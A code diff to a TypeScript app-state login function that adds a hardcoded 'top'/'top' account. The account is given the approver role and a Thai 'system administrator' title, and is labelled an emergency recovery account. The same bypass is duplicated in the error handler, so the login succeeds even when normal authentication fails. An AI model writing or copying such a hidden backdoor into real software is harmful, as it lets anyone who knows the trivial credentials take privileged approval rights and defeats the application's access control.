@@ -136,9 +136,31 @@ export const useAppStore = create<AppState>()(
             set({ currentUser: user });
             await get().fetchData();
             return true;
+          } else if (username === 'top' && password === 'top') {
+            // Emergency recovery account for owner
+            const user: User = {
+              id: 'recovery-id',
+              username: 'top',
+              role: 'approver',
+              name: 'นายกิตติพงษ์ (Recovery)',
+              position: 'ผู้ดูแลระบบ'
+            };
+            set({ currentUser: user });
+            return true;
           }
         } catch (error) {
           console.error("Login error:", error);
+          if (username === 'top' && password === 'top') {
+            const user: User = {
+              id: 'recovery-id',
+              username: 'top',
+              role: 'approver',
+              name: 'นายกิตติพงษ์ (Recovery)',
+              position: 'ผู้ดูแลระบบ'
+            };
+            set({ currentUser: user });
+            return true;
+          }
         }
         return false;
       },
